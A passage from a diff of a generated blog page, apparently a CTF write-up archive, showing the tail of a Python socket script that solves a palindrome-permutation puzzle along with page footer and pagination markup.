s.recv()</span><br><span class="line">        <span class="keyword">if</span> inp.find(<span class="string">&quot;Input:&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> inp</span><br><span class="line">    inp = inp[inp.find(<span class="string">&quot;Input:&quot;</span>)+<span class="number">7</span>:inp.find(<span class="string">&quot;Answer&quot;</span>)].strip()</span><br><span class="line">    L = inp.split()</span><br><span class="line">    num = <span class="built_in">int</span>(L[<span class="number">0</span>])</span><br><span class="line">    L.remove(L[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">#print num,L</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> permutations(L,num):</span><br><span class="line">        <span class="keyword">if</span> isPalindrome(<span class="string">&quot;&quot;</span>.join(j)):</span><br><span class="line">            s.sendline(<span class="string">&quot; &quot;</span>.join(j))</span><br><span class="line">            <span class="comment">#print &quot; &quot;.join(j)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/47/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/47/">47</a><span class="page-number current">48</span><a class="page-number" href="/page/49/">49</a><span class="space">&hellip;</span><a class="page-number" href="/page/82/">82</a><a class="extend next" rel="next" href="/page/49/">&gt;</a>
+    <a class="extend prev" rel="prev" href="/page/47/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/47/">47</a><span class="page-number current">48</span><a class="page-number" href="/page/49/">49</a><span class="space">&hellip;</span><a class="page-number" href="/page/73/">73</a><a class="extend next" rel="next" href="/page/49/">&gt;</a>
   </nav>
 
 
@@ -3871,7 +3780,7 @@ cat: ._flag: No such file or directory
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">1622</span>
+                  <span class="site-state-item-count">1451</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
